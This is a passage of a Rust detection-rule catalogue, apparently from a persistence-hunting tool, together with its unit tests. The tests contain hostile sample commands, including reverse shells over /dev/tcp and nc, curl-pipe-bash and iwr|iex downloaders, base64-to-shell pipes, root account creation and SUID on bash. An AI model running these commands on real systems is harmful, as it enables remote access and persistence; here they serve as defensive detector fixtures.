        check: |r| is_linux(r) && r.technique.starts_with("shell:") && any(&r.command_lower, SHELL_HOOK_HIGH) && !alias_is_wrapper(&r.command_lower),
    },
    Rule {
        id: "H2016",
        attack: "T1562.003",
        level: Level::Medium,
        title: "Shell profile hides history or shadows a tool",
        check: |r| is_linux(r) && r.technique.starts_with("shell:") && any(&r.command_lower, SHELL_HOOK_MEDIUM) && !alias_is_wrapper(&r.command_lower),
    },
    Rule {
        id: "H2017",
        attack: "T1176",
        level: Level::High,
        title: "Browser extension forced from outside the store",
        check: |r| r.os == Os::Linux && is_browser_technique(r) && r.raw_lower.contains("update_url=") && any(&r.raw_lower, &["policy", "external_extensions", "forced"]),
    },
    Rule {
        id: "H2018",
        attack: "T1176",
        level: Level::Medium,
        title: "Browser extension installed outside the store",
        check: |r| {
            r.os == Os::Linux
                && is_browser_technique(r)
                && (r.raw_lower.contains("update_url=") || any(&r.raw_lower, &["unpacked", "sideloaded", "manifest on disk", "external", "by policy", "force-installed"]))
                && !(r.raw_lower.contains("update_url=") && any(&r.raw_lower, &["policy", "external_extensions", "forced"]))
        },
    },
    Rule {
        id: "H2019",
        attack: "T1176",
        level: Level::Low,
        title: "Browser extension with risky permissions",
        check: |r| r.os == Os::Linux && is_browser_technique(r) && r.raw_lower.contains("permissions="),
    },
    Rule {
        id: "H2020",
        attack: "T1547.013",
        level: Level::Low,
        title: "XDG autostart outside the package tree",
        check: |r| is_linux(r) && r.technique == "xdg:autostart" && !r.family.is_system() && r.family != DirFamily::Bare,
    },
    Rule {
        id: "H2021",
        attack: "T1546.016",
        level: Level::Medium,
        title: "udev rule running a shell",
        check: |r| is_linux(r) && r.technique == "udev:run_action" && any(&r.raw_lower, &["/bin/sh -c", "/bin/bash -c", "sh -c", "bash -c"]),
    },
    // ── both systems ─────────────────────────────────────────────────────
    Rule {
        id: "H3001",
        attack: "T1547",
        level: Level::High,
        title: "Persistence from a scratch folder",
        check: |r| runs_code(r) && r.family.is_scratch(),
    },
    Rule {
        id: "H3002",
        attack: "T1547",
        level: Level::Low,
        title: "Executes from AppData, ProgramData, a home or a hidden folder",
        check: |r| runs_code(r) && matches!(r.family, DirFamily::UserAppData | DirFamily::UserLocalAppData | DirFamily::ProgramData | DirFamily::Home | DirFamily::RootHome | DirFamily::Run),
    },
    Rule {
        id: "H3003",
        attack: "T1564.001",
        level: Level::Medium,
        title: "Executes from a user profile folder or a hidden directory",
        check: |r| runs_code(r) && matches!(r.family, DirFamily::UserProfile | DirFamily::Hidden),
    },
    Rule {
        id: "H3004",
        attack: "T1105",
        level: Level::High,
        title: "Downloads and runs content",
        check: |r| {
            !is_browser_technique(r)
                && (any(&r.command_lower, DOWNLOAD_EXECUTE)
                    || tokens(&r.command_lower).any(|t| matches!(t, "iwr" | "irm"))
                    || (any(&r.command_lower, &["curl ", "wget "]) && any(&r.command_lower, &["http://", "https://", "ftp://"])))
        },
    },
    Rule {
        id: "H3005",
        attack: "T1059",
        level: Level::High,
        title: "Reverse shell",
        check: |r| !is_browser_technique(r) && any(&r.command_lower, REVERSE_SHELL),
    },
    Rule {
        id: "H3006",
        attack: "T1027",
        level: Level::High,
        title: "Encoded or obfuscated payload",
        check: |r| !is_browser_technique(r) && (any(&r.command_lower, OBFUSCATION) || tokens(&r.command_lower).any(|t| t == "iex")),
    },
    Rule {
        id: "H3007",
        attack: "T1219",
        level: Level::High,
        title: "Known offensive or tunnelling tool",
        check: |r| !is_browser_technique(r) && has_tool(r, OFFENSIVE_TOOLS),
    },
    Rule {
        id: "H3008",
        attack: "T1219",
        level: Level::Medium,
        title: "Remote management tool",
        check: |r| !is_browser_technique(r) && has_tool(r, RMM_TOOLS),
    },
    Rule {
        id: "H3009",
        attack: "T1567.002",
        level: Level::Medium,
        title: "Cloud sync or transfer tool",
        check: |r| !is_browser_technique(r) && has_tool(r, SYNC_TOOLS),
    },
    Rule {
        id: "H3010",
        attack: "T1562.001",
        level: Level::High,
        title: "Disables defences or clears logs",
        check: |r| !is_browser_technique(r) && any(&r.command_lower, DEFENCE_TAMPERING),
    },
    Rule {
        id: "H3011",
        attack: "T1543",
        level: Level::Medium,
        title: "Installs further persistence or changes accounts",
        check: |r| !is_browser_technique(r) && any(&r.command_lower, FURTHER_PERSISTENCE),
    },
    Rule {
        id: "H3012",
        attack: "T1548.001",
        level: Level::High,
        title: "Sets SUID, capabilities or loader variables",
        check: |r| !is_browser_technique(r) && any(&r.command_lower, PRIVESC),
    },
    Rule {
        id: "H3013",
        attack: "T1036",
        level: Level::Low,
        title: "Random-looking or tiny file name",
        check: |r| runs_code(r) && matches!(r.name_class, NameClass::HexLike | NameClass::DigitHeavy | NameClass::Tiny) && r.family != DirFamily::Bare,
    },
    Rule {
        id: "H3014",
        attack: "T1070",
        level: Level::Low,
        title: "No longer present on the live system",
        check: |r| r.state != State::Live,
    },
    Rule {
        id: "H3015",
        attack: "T1036",
        level: Level::Low,
        title: "Image in the drive root",
        check: |r| runs_code(r) && r.family == DirFamily::DriveRoot,
    },
];

/// Every rule the row triggers, in catalogue order.
pub fn matching(row: &Row) -> Vec<&'static Rule> {
    RULES.iter().filter(|r| r.matches(row)).collect()
}

pub fn by_id(id: &str) -> Option<&'static Rule> {
    RULES.iter().find(|r| r.id == id)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::Event;
    use crate::hunt::normalize::normalize;

    fn row(artifact: &str, cmd: &str) -> Row {
        let e = Event {
            timestamp: "2026-10-28 12:00:00.000".into(),
            computer: "H".into(),
            artifact: artifact.into(),
            event_id: 0,
            pid: 0,
            subject_username: "User".into(),
            target_username: "User".into(),
            processname: String::new(),
            commandline: Some(cmd.into()),
            parentprocessname: "where".into(),
        };
        normalize(0, &e)
    }

    fn ids(artifact: &str, cmd: &str) -> Vec<&'static str> {
        matching(&row(artifact, cmd)).iter().map(|r| r.id).collect()
    }

    #[test]
    fn catalogue_ids_are_unique_and_prefixed() {
        let mut seen = std::collections::HashSet::new();
        for r in RULES {
            assert!(seen.insert(r.id), "duplicate {}", r.id);
            assert!(r.id.starts_with("H1") || r.id.starts_with("H2") || r.id.starts_with("H3"), "{}", r.id);
            assert!(r.attack.starts_with('T'), "{}", r.id);
            assert!(!r.title.is_empty());
        }
        assert!(RULES.len() >= 50);
    }

    #[test]
    fn stock_run_entries_trigger_nothing() {
        assert!(ids("windows:persistence:registry_run_key", "C:\\Windows\\system32\\SecurityHealthSystray.exe").is_empty());
        assert!(ids("windows:persistence:windows_service", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p").is_empty());
        assert!(ids("windows:persistence:winlogon_shell_property", "explorer.exe").is_empty());
        assert!(ids("windows:persistence:winlogon_userinit_property", "C:\\Windows\\system32\\userinit.exe,").is_empty());
        assert!(ids("windows:persistence:safeboot_alternateshell", "cmd.exe").is_empty());
        assert!(ids("windows:persistence:lsa_packages", "msv1_0").is_empty());
        assert!(ids("linux:cron:system_job", "System Cron: cd / && run-parts --report /etc/cron.hourly (File: /etc/crontab)").is_empty());
        assert!(ids("linux:systemd:service", "Systemd Unit: ssh.service (Desc: OpenBSD Secure Shell server, Exec: /usr/sbin/sshd -D $SSHD_OPTS)").is_empty());
        assert!(ids("linux:shell:profile_d", "/etc/profile.d/bash_completion.sh [line 1]: alias ls='ls --color=auto'").is_empty());
    }

    #[test]
    fn lolbin_remote() {
        assert!(ids("windows:persistence:registry_run_key", "mshta http://evil.example/a.hta").contains(&"H1001"));
        assert!(ids("windows:persistence:registry_run_key", "regsvr32 /s /n /u /i:https://x/a.sct scrobj.dll").contains(&"H1001"));
        assert!(!ids("windows:persistence:registry_run_key", "\"C:\\Program Files\\App\\app.exe\" --url https://vendor.example").contains(&"H1001"));
    }

    #[test]
    fn powershell_flags() {
        let i = ids("windows:persistence:scheduled_task", "powershell.exe -nop -w hidden -enc SQBFAFgA");
        assert!(i.contains(&"H1002"));
        assert!(i.contains(&"H3006"));
        assert!(ids("windows:persistence:scheduled_task", "powershell.exe -File C:\\Scripts\\backup.ps1").iter().all(|x| *x != "H1002" && *x != "H3006"));
    }

    #[test]
    fn rundll32_hosts() {
        assert!(ids("windows:persistence:registry_run_key", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(...)").contains(&"H1003"));
        assert!(ids("windows:persistence:registry_run_key", "rundll32 url.dll,OpenURL C:\\x.hta").contains(&"H1003"));
        assert!(!ids("windows:persistence:registry_run_key", "rundll32.exe C:\\Windows\\system32\\dfdts.dll,DfdGetDefaultPolicyAndSMART").contains(&"H1003"));
    }

    #[test]
    fn masquerading() {
        assert!(ids("windows:persistence:registry_run_key", "C:\\Users\\Public\\svchost.exe").contains(&"H1004"));
        assert!(ids("windows:persistence:registry_run_key", "C:\\ProgramData\\lsass.exe").contains(&"H1004"));
        assert!(!ids("windows:persistence:registry_run_key", "C:\\Windows\\explorer.exe").contains(&"H1004"));
        assert!(!ids("windows:persistence:winlogon_shell_property", "explorer.exe").contains(&"H1004"));
    }

    #[test]
    fn winlogon() {
        assert!(ids("windows:persistence:winlogon_shell_property", "explorer.exe, C:\\Users\\Public\\x.exe").contains(&"H1005"));
        assert!(ids("windows:persistence:winlogon_shell_property", "C:\\ProgramData\\shell.exe").contains(&"H1005"));
        assert!(ids("windows:persistence:winlogon_userinit_property", "C:\\Windows\\system32\\userinit.exe, C:\\x\\y.exe").contains(&"H1005"));
    }

    #[test]
    fn debuggers() {
        assert!(ids("windows:persistence:image_file_execution_options", "C:\\Windows\\system32\\cmd.exe").contains(&"H1006"));
        assert!(ids("windows:persistence:image_file_execution_options", "\"C:\\Program Files\\Tools\\dbg.exe\" -p").contains(&"H1007"));
        assert!(ids("windows:persistence:image_file_execution_options", "\"C:\\Program Files (x86)\\Microsoft Visual Studio\\vsjitdebugger.exe\" -p %ld -e %ld").is_empty());
        assert!(ids("windows:persistence:silent_process_exit_monitor", "C:\\Users\\bob\\AppData\\Roaming\\m.exe").contains(&"H1006"));
    }

    #[test]
    fn dll_slots() {
        assert!(ids("windows:persistence:appinit_dlls", "C:\\Users\\bob\\AppData\\Roaming\\hook.dll").contains(&"H1008"));
        assert!(ids("windows:persistence:com_object_hijacking", "C:\\Users\\bob\\AppData\\Local\\x\\x.dll").contains(&"H1008"));
        assert!(!ids("windows:persistence:print_monitor_dll", "localspl.dll").contains(&"H1008"));
        assert!(!ids("windows:persistence:shell_extension___bho", "C:\\Program Files\\7-Zip\\7-zip.dll").contains(&"H1008"));
    }

    #[test]
    fn scripts_and_extensions() {
        assert!(ids("windows:persistence:registry_run_key", "wscript.exe C:\\Users\\bob\\AppData\\Roaming\\a.vbs").contains(&"H1009"));
        assert!(ids("windows:persistence:registry_run_key", "C:\\Users\\bob\\Downloads\\invoice.pdf.exe").contains(&"H1010"));
        assert!(ids("windows:persistence:registry_run_key", "C:\\Users\\bob\\x.txt:evil.exe").contains(&"H1011"));
        assert!(ids("windows:persistence:registry_run_key", "rundll32 C:\\ProgramData\\cache.dat,Entry").contains(&"H1014"));
        assert!(ids("windows:persistence:registry_run_key", "\\\\srv\\share\\upd.exe").contains(&"H1013"));
    }

    #[test]
    fn rare_slots() {
        assert!(ids("windows:persistence:service_failure_command", "cmd /c C:\\x.bat").contains(&"H1012"));
        assert!(!ids("windows:persistence:safeboot_alternateshell", "cmd.exe").contains(&"H1012"));
        assert!(!ids("windows:persistence:screensaver", "C:\\Windows\\system32\\scrnsave.scr").contains(&"H1012"));
        assert!(ids("windows:persistence:screensaver", "C:\\Users\\bob\\x.scr").contains(&"H1012"));
    }

    #[test]
    fn system_task_from_user_folder() {
        let e = Event {
            timestamp: String::new(),
            computer: "H".into(),
            artifact: "windows:persistence:scheduled_task".into(),
            event_id: 0,
            pid: 0,
            subject_username: "System".into(),
            target_username: "System".into(),
            processname: String::new(),
            commandline: Some("C:\\ProgramData\\upd\\upd.exe".into()),
            parentprocessname: "\\Upd".into(),
        };
        let r = normalize(0, &e);
        assert!(matching(&r).iter().any(|x| x.id == "H1015"));
    }

    #[test]
    fn browser_rules_windows() {
        assert!(ids("windows:persistence:browser_extension", "chrome abcdef [force-installed by policy] update_url=https://evil.example/u.xml").contains(&"H1017"));
        assert!(ids("windows:persistence:browser_extension", "chrome abcdef \"X\" v1 [unpacked (developer mode), path C:\\x] permissions=<all_urls>").contains(&"H1018"));
        assert!(ids("windows:persistence:browser_extension", "chrome abcdef \"X\" v1 [store] permissions=cookies").contains(&"H1019"));
        assert!(ids("windows:persistence:browser_extension", "chrome abcdef \"X\" v1 [store]").is_empty());
    }

    #[test]
    fn linux_high_rules() {
        assert!(ids("linux:rootkit:ld_so_preload", "Preloaded Dynamic Library: /lib/x.so").contains(&"H2001"));
        assert!(ids("linux:pam:permit_bypass", "PAM Bypass [/etc/pam.d/sshd line 1]: auth sufficient pam_permit.so").contains(&"H2002"));
        assert!(ids("linux:pam:custom_module_path", "PAM [/etc/pam.d/common-auth line 1]: auth required /tmp/x.so").contains(&"H2003"));
        assert!(ids("linux:ssh:force_command", "sshd_config [line 3]: ForceCommand /opt/x").contains(&"H2004"));
        assert!(ids("linux:process:deleted_binary_in_memory", "Executing Binary Link: /tmp/x (deleted)").contains(&"H2014"));
        assert!(ids("linux:modprobe:install_command", "Modprobe Install Hook [/etc/modprobe.d/x.conf line 1]: install usb /tmp/x.sh").contains(&"H2011"));
        assert!(ids("linux:modprobe:install_command", "Modprobe Install Hook [/etc/modprobe.d/x.conf line 1]: install dccp /bin/true").contains(&"H2012"));
        assert!(ids("linux:apt:package_hook", "APT Hook [/etc/apt/apt.conf.d/99x line 1]: APT::Update::Pre-Invoke {\"/opt/.x/run\";};").contains(&"H2013"));
    }

    #[test]
    fn linux_shell_hooks() {
        assert!(ids("linux:shell:bashrc", "/home/u/.bashrc [line 9]: alias sudo='/tmp/.s/sudo'").contains(&"H2015"));
        assert!(ids("linux:shell:bashrc", "/home/u/.bashrc [line 9]: export LD_PRELOAD=/tmp/x.so").contains(&"H2015"));
        assert!(ids("linux:shell:bashrc", "/home/u/.bashrc [line 9]: alias ls='/tmp/ls'").contains(&"H2016"));
        assert!(ids("linux:shell:bashrc", "/home/u/.bashrc [line 9]: export HISTFILE=/dev/null").contains(&"H2016"));
        assert!(ids("linux:shell:bashrc", "/home/u/.bashrc [line 9]: alias ls='ls --color=auto'").is_empty());
        assert!(ids("linux:shell:bashrc", "/home/u/.bashrc [line 9]: alias grep='grep --color=auto'").is_empty());
    }

    #[test]
    fn linux_sudoers() {
        assert!(ids("linux:sudoers:nopasswd", "Sudoers [/etc/sudoers line 2]: bob ALL=(ALL) NOPASSWD: ALL").contains(&"H2009"));
        assert!(!ids("linux:sudoers:nopasswd", "Sudoers [/etc/sudoers.d/90-cloud-init-users line 2]: ubuntu ALL=(ALL) NOPASSWD:ALL").contains(&"H2009"));
        assert!(ids("linux:sudoers:defaults_override", "Sudoers Defaults [/etc/sudoers line 1]: Defaults !syslog").contains(&"H2010"));
        assert!(ids("linux:sudoers:defaults_override", "Sudoers Defaults [/etc/sudoers line 1]: Defaults env_reset").is_empty());
    }

    #[test]
    fn linux_cron_and_daemons() {
        assert!(ids("linux:cron:user_spool", "User Cron * * * * *: /home/u/x.sh").contains(&"H2006"));
        assert!(!ids("linux:cron:user_spool", "User Cron 0 3 * * *: /home/u/x.sh").contains(&"H2006"));
        assert!(ids("linux:systemd:service", "Systemd Unit: k.service (Desc: x, Exec: /tmp/kworker)").contains(&"H2007"));
        assert!(!ids("linux:systemd:service", "Systemd Unit: k.service (Desc: x, Exec: /usr/sbin/sshd)").contains(&"H2007"));
        assert!(ids("linux:udev:run_action", "Udev [/etc/udev/rules.d/x.rules line 1]: ACTION==\"add\", RUN+=\"/bin/sh -c '/tmp/x'\"").contains(&"H2021"));
        assert!(ids("linux:cron:system_job", "System Cron: chmod +x /opt/x && nohup /opt/x & (File: /etc/cron.d/x)").contains(&"H2008"));
    }

    #[test]
    fn shared_rules() {
        assert!(ids("linux:cron:system_job", "System Cron: curl -s http://x/a.sh | bash (File: /etc/cron.d/x)").contains(&"H3004"));
        assert!(ids("windows:persistence:registry_run_key", "cmd /c certutil -urlcache -split -f http://x/a.exe C:\\x.exe").contains(&"H3004"));
        assert!(ids("linux:cron:user_spool", "User Cron: @reboot bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").contains(&"H3005"));
        assert!(ids("linux:cron:user_spool", "User Cron: @reboot nc -e /bin/sh 10.0.0.1 4444").contains(&"H3005"));
        assert!(ids("linux:cron:user_spool", "User Cron: @reboot echo aGk= | base64 -d | sh").contains(&"H3006"));
        assert!(ids("windows:persistence:windows_service", "C:\\Tools\\mimikatz.exe").contains(&"H3007"));
        assert!(ids("linux:systemd:service", "Systemd Unit: c.service (Desc: x, Exec: /opt/chisel client 1.2.3.4:443 R:socks)").contains(&"H3007"));
        assert!(!ids("windows:persistence:windows_service", "C:\\Program Files\\sync\\sync.exe").contains(&"H3007"));
        assert!(ids("windows:persistence:windows_service", "\"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe\" --service").contains(&"H3008"));
        assert!(ids("linux:cron:user_spool", "User Cron 0 * * * *: rclone sync /data remote:bucket").contains(&"H3009"));
        assert!(ids("windows:persistence:scheduled_task", "powershell Set-MpPreference -DisableRealtimeMonitoring $true").contains(&"H3010"));
        assert!(ids("linux:boot:rc_local", "rc.local [line 2]: setenforce 0").contains(&"H3010"));
        assert!(ids("windows:persistence:registry_run_key", "cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\x.exe").contains(&"H3011"));
        assert!(ids("linux:cron:system_job", "System Cron: useradd -ou 0 -g 0 sys (File: /etc/cron.d/x)").contains(&"H3011"));
        assert!(ids("linux:cron:system_job", "System Cron: chmod u+s /bin/bash (File: /etc/cron.d/x)").contains(&"H3012"));
        assert!(ids("windows:persistence:scheduled_task", "powershell -c \"iwr http://x/a.ps1 | iex\"").contains(&"H3004"));
        assert!(ids("windows:persistence:scheduled_task", "powershell -c \"irm http://x/a.ps1 | iex\"").contains(&"H3006"));
    }

    /// Rows seen on a stock Ubuntu host during calibration: none of them is known-bad.
    #[test]
    fn stock_ubuntu_rows_do_not_fire_high_rules() {
        let quiet = [
            ("linux:systemd:service", "Systemd Unit: grub-common.service (Desc: Record successful boot for GRUB, Exec: /bin/sh -c 'if grub-editenv /boot/grub/grubenv list | grep -q initrdless_boot_fallback_triggered=1; then echo \"grub: GRUB_FORCE_PARTUUID set, initrdless boot paniced, fallback triggered.\"; fi')"),
            ("linux:systemd:service", "Systemd Unit: cloud-init-hotplugd.service (Desc: Cloud-init: Hotplug Hook, Exec: /bin/bash -c 'read args <&3; echo \"args=$args\"; exec /usr/bin/cloud-init devel hotplug-hook $args; exit 0')"),
            ("linux:udev:run_action", "Udev [69-md-clustered-confirm-device.rules line 18]: ENV{.md.newdevice}!=\"\", RUN+=\"/sbin/mdadm --manage $env{DEVNAME} --cluster-confirm $env{RAID_DISK}:$env{.md.newdevice}\""),
            ("linux:udev:run_action", "Udev [80-drivers.rules line 5]: ENV{MODALIAS}==\"?*\", RUN{builtin}+=\"kmod load $env{MODALIAS}\""),
            ("linux:udev:run_action", "Udev [60-persistent-storage.rules line 9]: KERNEL==\"sd*\", RUN+=\"/sbin/modprobe sg\""),
            ("linux:systemd:service", "Systemd Unit: sssd-autofs.service (Desc: SSSD AutoFS Service responder, Exec: -/bin/chown root:root /var/log/sssd/sssd_autofs.log)"),
            ("linux:systemd:service", "Systemd Unit: initrd-parse-etc.service (Desc: Reload Configuration from the Real Root, Exec: -systemctl daemon-reload)"),
            ("linux:systemd:service", "Systemd Unit: initrd-udevadm-cleanup-db.service (Desc: Cleanup udevd DB, Exec: mount -o remount,rw /)"),
            ("linux:systemd:socket", "Systemd Activation [docker.socket]: ListenStream=/run/docker.sock"),
            ("linux:cron:system_job", "System Cron: test -x /usr/sbin/logrotate && zcat -f /var/log/x.gz > /dev/null (File: /etc/cron.d/x)"),
        ];
        for (technique, cmd) in quiet {
            let fired = ids(technique, cmd);
            let high: Vec<&str> = fired.iter().copied().filter(|id| by_id(id).map(|r| r.level == Level::High).unwrap_or(false)).collect();
            assert!(high.is_empty(), "{cmd}: {high:?}");
            assert!(!fired.contains(&"H3011"), "{cmd}: {fired:?}");
        }
    }

    #[test]
    fn folder_rules() {
        assert!(ids("windows:persistence:registry_run_key", "C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe").contains(&"H3001"));
        assert!(ids("linux:systemd:service", "Systemd Unit: x.service (Desc: x, Exec: /dev/shm/x)").contains(&"H3001"));
        assert!(ids("windows:persistence:registry_run_key", "C:\\Users\\bob\\AppData\\Roaming\\x\\x.exe").contains(&"H3002"));
        assert!(ids("windows:persistence:registry_run_key", "C:\\Users\\bob\\Documents\\x.exe").contains(&"H3003"));
        assert!(ids("linux:cron:user_spool", "User Cron 0 * * * *: /home/u/.cache/.x/run").contains(&"H3003"));
        assert!(ids("windows:persistence:registry_run_key", "C:\\x.exe").contains(&"H3015"));
        assert!(ids("windows:persistence:registry_run_key", "C:\\ProgramData\\deadbeef01.exe").contains(&"H3013"));
        assert!(ids("windows:persistence:deleted:registry_run_key", "C:\\Windows\\system32\\x.exe").contains(&"H3014"));
        assert!(!ids("windows:persistence:browser_extension", "chrome abc [store]").contains(&"H3002"));
    }
}
